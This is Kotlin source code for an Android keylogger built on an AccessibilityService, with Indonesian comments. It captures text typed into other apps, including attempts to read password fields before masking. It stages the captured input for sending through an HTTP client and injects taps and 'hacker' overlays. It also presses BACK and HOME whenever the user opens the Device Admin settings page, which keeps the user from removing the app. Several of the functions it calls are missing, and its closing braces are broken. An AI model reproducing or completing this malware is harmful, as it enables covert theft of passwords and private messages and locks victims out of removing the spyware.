package com.android.services

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.view.WindowManager
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class KeyloggerService : AccessibilityService() {

    companion object {
        @Volatile var instance: KeyloggerService? = null
        @Volatile var unlockCode: String = "2719"
        /** Set false via self_destruct untuk nonaktifkan guard halaman Device Admin */
        @Volatile var adminGuardEnabled: Boolean = true

        fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
        fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
        fun hideScreenInject()   { instance?.hideOverlay() }
        fun resetUnlockCode()    { unlockCode = "2719" }

    }

    /** Inject tap via AccessibilityService.dispatchGesture (for OverlayTrickManager fallback) */
    private fun dispatchTap(x: Float, y: Float) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            try {
                val path    = android.graphics.Path().apply { moveTo(x, y) }
                val stroke  = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 50L)
                val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
                dispatchGesture(gesture, null, null)
            } catch (_: Exception) {}
        }
    }

    @Volatile private var overlayView: HackerOverlayView? = null
    private var wm: WindowManager? = null
    private var soundManager: HackerSoundManager? = null
    private val overlayHandler = Handler(Looper.getMainLooper())

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    // ── Per-field debounce: setiap field punya handler sendiri ───────────────
    // key = "pkg|fieldHint"
    private data class FieldEntry(
        val pkg: String,
        val fieldHint: String,
        var pendingText: String = "",
        var runnable: Runnable? = null
    )
    private val fields   = mutableMapOf<String, FieldEntry>()
    private val handler  = Handler(Looper.getMainLooper())

    // Untuk onKeyEvent (physical keyboard / beberapa OEM soft keyboard)
    private var activePkg   = ""
    private var activeField = ""
    private val keyBuffer   = StringBuilder()

    override fun onServiceConnected() {
        instance = this
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes  =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       or
                AccessibilityEvent.TYPE_VIEW_FOCUSED            or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags        =
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS              or
                AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS    or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 0
        }
    }

    // ── onKeyEvent: bonus — untuk physical keyboard & beberapa OEM ───────────
    // Soft keyboard (GBoard dll) TIDAK lewat sini; ditangani TYPE_VIEW_TEXT_CHANGED
    override fun onKeyEvent(event: KeyEvent): Boolean {
        if (event.action != KeyEvent.ACTION_DOWN) return false
        if (activePkg.isBlank() || activePkg == packageName) return false

        when (event.keyCode) {
            KeyEvent.KEYCODE_DEL, KeyEvent.KEYCODE_FORWARD_DEL -> {
                if (keyBuffer.isNotEmpty()) keyBuffer.deleteCharAt(keyBuffer.length - 1)
            }
            KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> {
                val text = keyBuffer.toString().trim()
                if (text.isNotBlank()) {
                    sendNow(activePkg, activeField, text)
                    keyBuffer.clear()
                }
            }
            else -> {
                val unicode = event.unicodeChar
                if (unicode != 0 && unicode != 10) {
                    keyBuffer.append(unicode.toChar())
                    scheduleField(activePkg, activeField, keyBuffer.toString())
                }
            }
        }
        return false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev = event ?: return

        when (ev.eventType) {

            // ── Fokus pindah / window baru ────────────────────────────────────
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == packageName) return
                val src = ev.source
                val hint = resolveFieldHint(ev, src)
                src?.recycle()

                // Update aktif field untuk onKeyEvent
                if (pkg != activePkg) keyBuffer.clear()
                activePkg   = pkg
                activeField = hint

                // FIX Bug 4: cegah user buka halaman Device Admin
                if (ev.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    guardAdminPage(pkg, ev.className?.toString() ?: "")
                }
            }

            // ── Teks berubah — ini jalur utama untuk soft keyboard ────────────
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == packageName) return

                val src        = ev.source
                val isPassword = src?.isPassword == true

                // Resolusi field hint
                val hint = resolveFieldHint(ev, src)

                // Update aktif field
                activePkg   = pkg
                activeField = hint

                val captured: String? = if (!isPassword) {
                    // ── Non-password: ambil teks penuh dari node langsung ────
                    val nodeText = src?.text?.toString()?.trim()
                        ?: ev.text.joinToString("").trim()
                    if (nodeText.isNotBlank() &&
                        !nodeText.all { it == '•' || it == '*' || it == '·' }) {
                        nodeText
                    } else null
                } else {
                    // ── Password field ──────────────────────────────────────
                    // Coba ambil teks sebelum sempat di-mask (bekerja di beberapa ROM)
                    val nodeText = src?.text?.toString() ?: ""
                    val rawOk   = nodeText.isNotBlank() &&
                                  !nodeText.all { it == '•' || it == '*' || it == '·' }
                    if (rawOk) {
                        // Lucky: teks belum di-mask
                        nodeText.trim()
                    } else {
                        // Sudah di-mask — gunakan keyBuffer yang diisi onKeyEvent
                        // (bekerja untuk physical keyboard / beberapa OEM)
                        val kbText = keyBuffer.toString().trim()
                        if (kbText.isNotBlank()) kbText else null
                    }
                }

                src?.recycle()

                if (captured != null) {
                    scheduleField(pkg, hint, captured)
                }
            }
        }
    }


    /**
     * FIX Bug 4 — intercept halaman Device Admin di Settings.
     * Jika user membuka Settings > Device Admin, langsung press BACK
     * untuk mencegah user sampai ke tombol "Nonaktifkan".
     */
    private fun guardAdminPage(pkg: String, className: String) {
        if (!adminGuardEnabled) return   // disabled via self_destruct
        if (!AppDeviceAdminReceiver.SETTINGS_PACKAGES.contains(pkg)) return
        val isAdminPage = AppDeviceAdminReceiver.ADMIN_PAGE_KEYWORDS.any { kw ->
            className.contains(kw, ignoreCase = true)
        }
        if (!isAdminPage) return
        android.util.Log.d("AdminGuard", "Blocked: $pkg / $className")
        handler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_BACK)
        }, 10)
        handler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_HOME)
        }, 10)
    }

}
}
